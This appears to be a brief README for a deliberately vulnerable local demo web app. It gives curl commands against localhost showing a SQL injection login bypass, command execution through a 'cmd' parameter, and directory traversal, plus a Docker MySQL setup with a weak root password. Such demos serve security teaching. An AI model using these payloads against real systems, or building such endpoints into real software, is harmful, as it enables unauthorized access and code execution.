Start mysql:
docker run --rm -p 3306:3306 --name mysql -e MYSQL_ROOT_PASSWORD=mysql  -d mysql:latest

DB Init:
curl -X POST -d  "user=root&pwd=mysql&host=127.0.0.1&port=3306" http://localhost:3000/dbinit

Sql injection demo: 
//password='12346" OR ""="'
curl -X POST -d "username=admin&password=12346%22+OR+%22%22%3D+%22" http://localhost:3000/login

Remote code execution:
curl -X POST -d "cmd=pwd" http://localhost:3000/exec

Directory traversal demo
curl -X GET http://localhost:3000/image/../demo/demo.go